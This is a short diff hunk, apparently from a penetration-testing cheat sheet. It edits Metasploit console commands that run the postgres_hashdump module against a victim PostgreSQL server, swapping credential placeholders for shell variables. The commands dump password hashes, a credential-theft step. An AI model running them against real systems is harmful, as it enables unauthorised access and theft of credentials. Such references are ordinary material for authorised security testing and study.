@@ -38,8 +38,8 @@ msf> run
 msfconsole
 msf> use auxiliary/scanner/postgres/postgres_hashdump
 msf> set rhosts $VICTIM_IP
-msf> set username <username>
-msf> set password <password>
+msf> set username $USER
+msf> set password $PASS
 msf> run
 ```
 
